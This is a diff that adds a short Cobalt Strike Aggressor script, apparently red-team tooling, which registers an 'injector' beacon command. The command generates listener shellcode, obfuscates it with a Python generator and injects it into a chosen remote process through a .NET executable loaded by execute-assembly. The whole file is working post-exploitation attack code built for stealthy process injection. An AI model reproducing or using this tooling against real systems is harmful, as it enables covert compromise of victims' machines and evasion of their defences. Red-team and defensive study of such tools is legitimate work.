@@ -1,0 +1,25 @@
+# Remote Process Injection Using .NET reflection and obfuscated shellcode
+# Author: Mr.Un1k0d3r RingZer0 Team
+
+beacon_command_register("injector", "execute-assembly remote process injection utility", "Usage: injection pid listener arch\n\n", "Relies on execute-assembly to load a .NET executable that inject obfuscated shellcode into the remote process");
+
+alias injector {
+	# Arguments
+	# 2 pid
+	# 3 listener
+	# 4 arch
+	blog($1, "Generating " . $4 . " shellcode for " . $3 . " listener."); 
+	$data = base64_encode(artifact($3, "raw", "", $4));
+	$handle = exec("python RemoteProcessInjection\\generator.py -s " . $data . " -a " . $4);
+	if (checkError($error)) {
+		warn($error);
+	}
+	wait($handle);
+	$obfuscated = readb($handle, -1);
+	closef($handle);
+	blog($1, $obfuscated);
+
+	blog($1, "Injecting the obfuscated shellcode into process with PID:  " . $2); 
+	bexecute_assembly($1, "RemoteProcessInjection\\RemoteInject.exe", $2 . " " . $obfuscated);
+	blog($1, "Process completed."); 
+}
